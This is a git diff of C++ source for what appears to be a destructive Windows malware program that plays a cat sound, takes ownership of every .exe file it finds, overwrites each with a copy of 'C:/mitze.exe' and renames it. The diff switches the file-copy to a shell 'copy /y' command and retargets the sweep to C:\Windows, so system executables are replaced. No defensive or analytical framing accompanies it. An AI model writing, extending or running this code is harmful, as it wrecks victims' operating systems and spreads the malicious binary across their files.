@@ -41,10 +41,13 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Chickfila = directory + std::string(FindFileData.cFileName);
 				mciSendString("play meow.mp3", NULL, 0, NULL);
 				string Gutter = "takeown /f " + string(Chickfila);
+				string Butter = "copy /y C:/mitze.exe "+ string(Chickfila);
+				cout << Chickfila.c_str();
 				const char* Sucker = Gutter.c_str();
+				const char* Sucker2 = Butter.c_str();
 				system(Sucker);
 				//PlaySound(TEXT("meow.mp3"),NULL,SND_FILENAME | SND_ASYNC);
-				CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+				system(Sucker2);
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 			}
 			else
@@ -74,7 +77,7 @@ int main(int argc, char* argv[])
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
 
-		FckFiles(string(1,toupper(char_array[i]))+":/","*.exe");
+		FckFiles("C:\\Windows","*.exe");
 	}
 
 }
